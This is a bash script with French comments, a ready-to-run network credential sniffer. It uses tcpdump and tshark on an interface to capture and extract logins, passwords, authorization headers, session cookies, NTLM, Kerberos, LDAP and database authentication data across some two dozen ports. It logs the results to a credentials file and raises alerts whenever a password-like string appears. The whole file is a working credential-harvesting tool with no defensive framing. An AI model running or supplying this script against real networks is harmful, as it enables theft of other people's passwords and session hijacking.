#!/bin/bash

# Configuration
INTERFACE="eth0"
OUTPUT_DIR="./captures"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_FILE="${OUTPUT_DIR}/credentials_${TIMESTAMP}.txt"
PCAP_FILE="${OUTPUT_DIR}/raw_capture_${TIMESTAMP}.pcap"

# Créer le dossier de sortie
mkdir -p "$OUTPUT_DIR"

# Ports à surveiller (étendu)
PORTS="port 21 or port 22 or port 23 or port 25 or port 53 or port 80 or port 88 or port 110 or port 143 or port 389 or port 443 or port 445 or port 465 or port 587 or port 636 or port 993 or port 995 or port 1433 or port 1521 or port 3306 or port 3389 or port 5432 or port 6379 or port 27017"

# Filtres étendus pour détecter plus de protocoles
DISPLAY_FILTER='
ftp.request.command=="PASS" or ftp.request.command=="USER" or
telnet.data contains "login:" or telnet.data contains "password:" or
smtp.req.command=="AUTH" or
pop.request.command=="PASS" or pop.request.command=="USER" or
imap.request.command=="LOGIN" or
ldap.protocolOp==0 or
http.request.method=="POST" or
http.authbasic or
http.authorization or
http.cookie contains "session" or
http.cookie contains "auth" or
http.request.uri contains "login" or
http.request.uri contains "auth" or
http.file_data contains "password" or
http.file_data contains "username" or
http.file_data contains "login" or
kerberos or
ntlmssp or
smb.cmd==0x73 or
mysql.login_request or
tds.login or
redis.command=="AUTH" or
dns.qry.name contains "login" or
ssl.handshake.ciphersuite
'

# Champs à extraire (étendu)
FIELDS="
-e frame.time
-e frame.number
-e ip.src
-e ip.dst
-e ip.proto
-e tcp.srcport
-e tcp.dstport
-e udp.srcport
-e udp.dstport
-e eth.src
-e eth.dst
-e ftp.request.command
-e ftp.request.arg
-e telnet.data
-e smtp.req.parameter
-e pop.request.parameter
-e imap.request.parameter
-e ldap.bindRequest.name
-e ldap.bindRequest.authentication
-e http.request.method
-e http.request.uri
-e http.request.full_uri
-e http.host
-e http.user_agent
-e http.authorization
-e http.cookie
-e http.file_data
-e http.form_urlencoded
-e kerberos.realm
-e ntlmssp.auth.username
-e ntlmssp.auth.domain
-e smb.account
-e mysql.user
-e mysql.schema
-e tds.login.username
-e redis.command
-e dns.qry.name
-e ssl.handshake.ciphersuite
"

echo "=== Capture de credentials avancée ==="
echo "Interface: $INTERFACE"
echo "Fichier de sortie: $OUTPUT_FILE"
echo "Fichier PCAP: $PCAP_FILE"
echo "Démarrage à: $(date)"
echo "Appuyez sur Ctrl+C pour arrêter..."
echo "========================================="

# Fonction de nettoyage
cleanup() {
    echo ""
    echo "Arrêt de la capture..."
    echo "Fichiers sauvegardés:"
    echo "  - Logs: $OUTPUT_FILE"
    echo "  - PCAP: $PCAP_FILE"
    echo "Statistiques:"
    if [[ -f "$OUTPUT_FILE" ]]; then
        echo "  - Lignes capturées: $(wc -l < "$OUTPUT_FILE")"
    fi
    if [[ -f "$PCAP_FILE" ]]; then
        echo "  - Taille PCAP: $(du -h "$PCAP_FILE" | cut -f1)"
    fi
    exit 0
}

# Gérer l'interruption
trap cleanup INT TERM

# Commande principale améliorée
sudo tcpdump -i "$INTERFACE" -s 65535 -w "$PCAP_FILE" -U "$PORTS" 2>/dev/null &
TCPDUMP_PID=$!

sleep 2  # Laisser tcpdump démarrer

# Analyse en temps réel
sudo tshark -i "$INTERFACE" -l \
    -Y "$DISPLAY_FILTER" \
    -T fields \
    $FIELDS \
    -E header=y \
    -E separator='|' \
    -E quote=d \
    -E occurrence=f \
    2>/dev/null | \
while IFS='|' read -r line; do
    echo "$line" | tee -a "$OUTPUT_FILE"
    
    # Alertes pour credentials critiques
    if echo "$line" | grep -i "password\|pass\|pwd\|auth" >/dev/null; then
        echo "🚨 [ALERT] Credential détecté: $(date)" | tee -a "${OUTPUT_FILE}.alerts"
    fi
done

# Nettoyage final
cleanup